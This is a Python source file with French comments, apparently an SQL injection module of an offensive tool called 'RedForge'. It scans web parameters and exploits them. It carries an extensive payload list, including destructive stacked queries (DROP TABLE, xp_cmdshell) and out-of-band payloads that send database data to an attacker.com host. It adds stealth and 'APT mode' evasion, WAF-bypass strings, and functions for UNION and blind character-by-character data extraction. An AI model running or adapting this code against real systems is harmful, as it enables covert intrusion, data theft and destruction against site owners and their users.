#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'injection SQL pour RedForge
Détecte et exploite les vulnérabilités d'injection SQL
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import hashlib
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class SQLInjectionConfig:
    """Configuration avancée pour l'injection SQL"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_payloads: int = 100
    timeout: int = 15
    level: int = 3  # 1-5
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_dbms: bool = True
    test_waf: bool = True
    use_time_based: bool = True
    max_time_delay: int = 10
    blind_threads: int = 5


class SQLInjection:
    """Détection et exploitation avancée des injections SQL"""
    
    def __init__(self, config: Optional[SQLInjectionConfig] = None):
        """
        Initialise le détecteur d'injection SQL
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or SQLInjectionConfig()
        
        # Payloads d'injection SQL organisés par catégorie
        self.payloads = self._generate_payloads()
        
        # Signatures DBMS
        self.dbms_signatures = {
            "MySQL": [
                r'MySQL', r'mysql', r'SQL syntax', r'MariaDB', r'Incorrect integer value',
                r'You have an error in your SQL syntax', r'MySQL server version',
                r'\\\' for the right syntax', r'check the manual that corresponds to your MySQL'
            ],
            "PostgreSQL": [
                r'PostgreSQL', r'pg_query', r'ERROR:  syntax error', r'relation.*does not exist',
                r'SQL state:', r'pg_catalog', r'current_schema'
            ],
            "MSSQL": [
                r'Microsoft SQL', r'ODBC', r'Driver.*SQL Server', r'@@ROWCOUNT',
                r'Microsoft OLE DB Provider for ODBC Drivers', r'Unclosed quotation mark',
                r'Server Error in', r'System.Data.SqlClient'
            ],
            "Oracle": [
                r'Oracle', r'ORA-[0-9]{5}', r'quoted string not properly terminated',
                r'ORA-01756', r'Oracle Database', r'javax.servlet.ServletException'
            ],
            "SQLite": [
                r'SQLite', r'sqlite', r'SQLite3::', r'SQLite error',
                r'SQLiteException', r'no such table'
            ]
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_payloads(self) -> Dict[str, List[str]]:
        """Génère une liste complète de payloads d'injection SQL"""
        unique_id = f"SQL_INJ_{int(time.time())}_{random.randint(1000,9999)}"
        
        payloads = {
            "Error Based": [
                "'", '"', "\\", "')", '"))', "';", '"%20;',
                "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
                '" OR "1"="1" --', "1' ORDER BY 1--", "1' ORDER BY 100--",
                "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
                "1' AND 1=1--", "1' AND 1=2--", "1' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],
            "Boolean Based": [
                "1' AND '1'='1", "1' AND '1'='2",
                "1' AND 1=1--", "1' AND 1=2--",
                "' OR 1=1--", "' OR 1=2--",
                "1' OR '1'='1", "1' OR '1'='2",
                "1' AND SUBSTRING(version(),1,1)=5",
                "1' AND ASCII(SUBSTRING(version(),1,1))>50"
            ],
            "Time Based": [
                "1' AND SLEEP(5)--", "1' AND pg_sleep(5)--",
                "1' WAITFOR DELAY '0:0:5'--", "1' AND BENCHMARK(5000000,MD5('test'))--",
                "' OR SLEEP(5)--", "1' OR pg_sleep(5)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
            ],
            "Union Based": [
                "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL--", "1' UNION SELECT 1,2,3--",
                "1' UNION SELECT version(),user(),database()--",
                "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
            ],
            "Stacked Queries": [
                "1'; DROP TABLE users--", "1'; INSERT INTO users VALUES('hacker','pass')--",
                "1'; UPDATE users SET password='hacked'--", "1'; SELECT * FROM users--",
                "1'; EXEC xp_cmdshell('dir')--"
            ],
            "Second Order": [
                "admin'--", "admin' #", "admin'/*", "admin' OR '1'='1",
                "admin' AND '1'='1", "admin' OR 1=1--"
            ],
            "WAF Bypass": [
                "1'/**/OR/**/'1'='1", "1'%0aOR%0a'1'='1", "1'||'1'='1",
                "1'%26%26'1'='1", "1' AND 1=1%00", "1' AND 1=1/*",
                "1' AND '1'='1'/**/--", "1' AND '1'='1'%23"
            ],
            "Out of Band": [
                f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{unique_id}.attacker.com\\\\test'))--",
                f"1' AND (SELECT utl_inaddr.get_host_address('{unique_id}.attacker.com') FROM dual) IS NULL--"
            ]
        }
        
        return payloads
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'injection SQL
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - data: Données POST
                - level: Niveau d'agressivité (1-5)
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Scan des injections SQL sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        tested_params = set()
        
        params_to_test = self._get_params_to_test(target, kwargs)
        post_data = kwargs.get('data')
        
        # Détection de WAF
        waf_detected = self._detect_waf(target) if self.config.test_waf else None
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            param_vulns = self._test_parameter(target, param, post_data, waf_detected)
            vulnerabilities.extend(param_vulns)
            
            if param_vulns:
                self.vulnerabilities_found += len(param_vulns)
                for vuln in param_vulns:
                    print(f"      ✓ Injection SQL: {param} -> {vuln['payload'][:40]}...")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'level' in kwargs:
            self.config.level = min(5, max(1, kwargs['level']))
        if 'max_payloads' in kwargs:
            self.config.max_payloads = kwargs['max_payloads']
        if 'use_time_based' in kwargs:
            self.config.use_time_based = kwargs['use_time_based']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.level = min(self.config.level, 3)
            self.config.max_payloads = min(self.config.max_payloads, 30)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        if not params:
            params = ['id', 'page', 'q', 'search', 's', 'cat', 'product', 'user', 
                     'username', 'email', 'name', 'code', 'num', 'no', 'order', 
                     'sort', 'filter', 'category', 'type', 'view', 'lang']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _detect_waf(self, target: str) -> Optional[str]:
        """Détecte la présence d'un WAF"""
        test_payload = "1' AND 1=1--"
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target + "?id=" + quote(test_payload), 
                                   headers=headers, timeout=10, verify=False)
            
            if response.status_code in [403, 406, 429, 501]:
                return "Unknown WAF"
            
            waf_signatures = {
                'cloudflare': 'Cloudflare',
                'modsecurity': 'ModSecurity',
                'aws': 'AWS WAF',
                'sucuri': 'Sucuri',
                'imperva': 'Imperva'
            }
            
            for sig, name in waf_signatures.items():
                if sig in response.headers.get('Server', '').lower() or sig in response.text.lower():
                    return name
                    
        except Exception:
            pass
        
        return None
    
    def _test_parameter(self, target: str, param: str, post_data: Optional[str],
                        waf_detected: Optional[str]) -> List[Dict[str, Any]]:
        """Teste un paramètre pour les injections SQL"""
        vulnerabilities = []
        
        for category, payload_list in self.payloads.items():
            # Limiter selon le niveau
            max_payloads = self.config.level * 8 if self.config.level < 5 else len(payload_list)
            payloads_to_test = payload_list[:min(max_payloads, self.config.max_payloads)]
            
            for payload in payloads_to_test:
                if self.config.random_delays:
                    time.sleep(random.uniform(0.3, 0.8))
                
                result = self._test_payload(target, param, payload, post_data)
                self.payloads_tested += 1
                
                if result['vulnerable']:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                        "category": category,
                        "severity": "CRITICAL",
                        "evidence": result['evidence'],
                        "dbms": result.get('dbms', 'unknown'),
                        "type": result.get('type', 'unknown'),
                        "risk_score": 95,
                        "waf_bypassed": waf_detected is not None
                    })
                    return vulnerabilities  # Arrêter pour ce paramètre
        
        return vulnerabilities
    
    def _test_payload(self, target: str, param: str, payload: str,
                      post_data: Optional[str] = None) -> Dict[str, Any]:
        """Teste un payload d'injection SQL"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'dbms': None,
            'type': None
        }
        
        try:
            headers = self._get_stealth_headers()
            
            if post_data:
                # Requête POST
                if isinstance(post_data, dict):
                    data_params = post_data.copy()
                else:
                    data_params = parse_qs(post_data) if post_data else {}
                    data_params = {k: v[0] if isinstance(v, list) else v for k, v in data_params.items()}
                
                data_params[param] = payload
                response = requests.post(target, data=data_params, headers=headers,
                                       timeout=self.config.timeout, verify=False)
            else:
                # Requête GET
                parsed = urlparse(target)
                query_params = parse_qs(parsed.query)
                
                if param in query_params:
                    original_value = query_params[param][0]
                    query_params[param] = [original_value + payload]
                else:
                    query_params[param] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                response = requests.get(test_url, headers=headers,
                                      timeout=self.config.timeout, verify=False)
            
            # Détection d'erreurs SQL
            if self.config.detect_dbms:
                for dbms, signatures in self.dbms_signatures.items():
                    for signature in signatures:
                        if re.search(signature, response.text, re.IGNORECASE):
                            result['vulnerable'] = True
                            result['evidence'] = signature
                            result['dbms'] = dbms
                            result['type'] = 'error_based'
                            return result
            
            # Détection boolean based
            if not result['vulnerable'] and any(x in payload for x in ['1=1', '1=2']):
                baseline = self._get_baseline_response(target, param, post_data)
                if baseline and abs(len(response.text) - baseline.get('length', 0)) > 50:
                    result['vulnerable'] = True
                    result['evidence'] = f'length_difference:{abs(len(response.text) - baseline["length"])}'
                    result['type'] = 'boolean_based'
                    return result
            
            # Détection time based
            if self.config.use_time_based and any(x in payload.lower() for x in ['sleep', 'pg_sleep', 'benchmark', 'waitfor']):
                start_time = time.time()
                response = requests.get(test_url, headers=headers,
                                      timeout=self.config.timeout + 5, verify=False)
                elapsed = time.time() - start_time
                
                if elapsed >= self.config.max_time_delay * 0.8:
                    result['vulnerable'] = True
                    result['evidence'] = f'time_based_delay:{elapsed:.2f}s'
                    result['type'] = 'time_based'
                    return result
                    
        except requests.Timeout:
            if self.config.use_time_based:
                result['vulnerable'] = True
                result['evidence'] = 'timeout'
                result['type'] = 'time_based'
        except Exception:
            pass
        
        return result
    
    def _get_baseline_response(self, target: str, param: str, 
                               post_data: Optional[str]) -> Optional[Dict]:
        """Récupère une réponse baseline pour comparaison"""
        try:
            headers = self._get_stealth_headers()
            
            if post_data:
                response = requests.post(target, data=post_data, headers=headers,
                                       timeout=10, verify=False)
            else:
                response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            return {"length": len(response.text), "status": response.status_code}
        except:
            return None
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "level": self.config.level,
                "use_time_based": self.config.use_time_based
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune injection SQL détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_type": {
                "error_based": len([v for v in vulnerabilities if v['type'] == 'error_based']),
                "boolean_based": len([v for v in vulnerabilities if v['type'] == 'boolean_based']),
                "time_based": len([v for v in vulnerabilities if v['type'] == 'time_based'])
            },
            "by_dbms": {
                "MySQL": len([v for v in vulnerabilities if v.get('dbms') == 'MySQL']),
                "PostgreSQL": len([v for v in vulnerabilities if v.get('dbms') == 'PostgreSQL']),
                "MSSQL": len([v for v in vulnerabilities if v.get('dbms') == 'MSSQL']),
                "Oracle": len([v for v in vulnerabilities if v.get('dbms') == 'Oracle'])
            },
            "critical": len(vulnerabilities),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Utiliser des requêtes paramétrées ou des ORM")
            recommendations.add("Échapper les entrées utilisateur")
            recommendations.add("Utiliser les stored procedures")
        
        if any(v['type'] == 'error_based' for v in vulnerabilities):
            recommendations.add("Désactiver l'affichage des erreurs SQL en production")
        
        if any(v['dbms'] == 'MySQL' for v in vulnerabilities):
            recommendations.add("Utiliser le principe du moindre privilège pour les comptes DB")
        
        return list(recommendations)
    
    def exploit_union(self, target: str, param: str, columns: int = 3) -> Dict[str, Any]:
        """
        Exploite une injection UNION
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            columns: Nombre de colonnes à extraire
        """
        result = {
            "success": False,
            "extracted": [],
            "columns": 0
        }
        
        # Déterminer le nombre de colonnes
        for i in range(1, columns + 3):
            query = f"1' ORDER BY {i}--"
            test_result = self._test_payload(target, param, query, None)
            if not test_result['vulnerable']:
                result["columns"] = i - 1
                break
        
        if result["columns"] > 0:
            queries = [
                f"1' UNION SELECT {','.join(['NULL'] * result['columns'])}--",
                f"1' UNION SELECT {','.join([str(i+1) for i in range(result['columns'])])}--",
                f"1' UNION SELECT database(),user(),version(){','.join(['NULL'] * (result['columns']-3))}--",
                f"1' UNION SELECT table_name,{','.join(['NULL'] * (result['columns']-1))} FROM information_schema.tables--"
            ]
            
            for query in queries:
                test_result = self._test_payload(target, param, query, None)
                if test_result['vulnerable']:
                    result["success"] = True
                    result["extracted"].append({
                        "query": query,
                        "evidence": test_result['evidence']
                    })
        
        return result
    
    def blind_extract_data(self, target: str, param: str, 
                           query: str, max_length: int = 50) -> Dict[str, Any]:
        """
        Extraction de données via blind boolean injection
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            query: Requête à exécuter (ex: "SELECT version()")
            max_length: Longueur maximale à extraire
        """
        result = {
            "success": False,
            "data": "",
            "length": 0
        }
        
        extracted = []
        
        for pos in range(1, max_length + 1):
            found = False
            for char in range(32, 127):  # Caractères imprimables
                # Construction du payload
                payload = f"1' AND ASCII(SUBSTRING(({query}),{pos},1))={char}--"
                
                test_result = self._test_payload(target, param, payload, None)
                
                if test_result['vulnerable'] and test_result['type'] == 'boolean_based':
                    extracted.append(chr(char))
                    found = True
                    break
            
            if not found:
                break
        
        if extracted:
            result["success"] = True
            result["data"] = ''.join(extracted)
            result["length"] = len(extracted)
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    injection = SQLInjection()
    results = injection.scan("https://example.com/page?id=1")
    print(f"Vulnérabilités SQL: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = SQLInjectionConfig(apt_mode=True, level=3, max_payloads=30)
    injection_apt = SQLInjection(config=apt_config)
    results_apt = injection_apt.scan("https://example.com/page?id=1", apt_mode=True)
    print(f"Vulnérabilités SQL (APT): {results_apt['count']}")
    
    # Exemple d'exploitation UNION
    if results_apt['vulnerabilities']:
        vuln = results_apt['vulnerabilities'][0]
        union_result = injection_apt.exploit_union(
            "https://example.com/page",
            vuln['parameter']
        )
        if union_result['success']:
            print(f"Exploit UNION réussi: {union_result['columns']} colonnes")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")